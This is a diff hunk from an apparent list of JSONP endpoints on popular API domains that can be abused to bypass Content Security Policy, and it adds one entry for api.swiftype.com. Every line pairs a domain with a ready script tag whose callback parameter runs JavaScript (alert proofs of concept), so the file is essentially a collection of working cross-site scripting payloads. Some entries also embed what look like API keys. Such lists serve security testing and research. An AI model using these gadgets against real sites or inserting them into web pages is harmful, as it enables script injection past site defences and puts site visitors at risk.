@@ -24,6 +24,7 @@ api.mixpanel.com	<script src="https://api.mixpanel.com/track/?callback=alert(133
 api.olark.com	<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>
 api.pinterest.com	<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>
 api.stackexchange.com	<script src="https://api.stackexchange.com/2.2/me?callback=alert(1)-"></script>
+api.swiftype.com	<script src="https://api.swiftype.com/api/v1/public/engines/search.json?callback=alert&engine_key=JDuYRnCLSDZzYWgBkoSB"></script>
 api.tumblr.com	<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=alert"></script>
 api.vk.com	<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
 api.wordpress.org	<script src="https://api.wordpress.org/stats/plugin/1.0/?slug=x&callback=alert"></script>
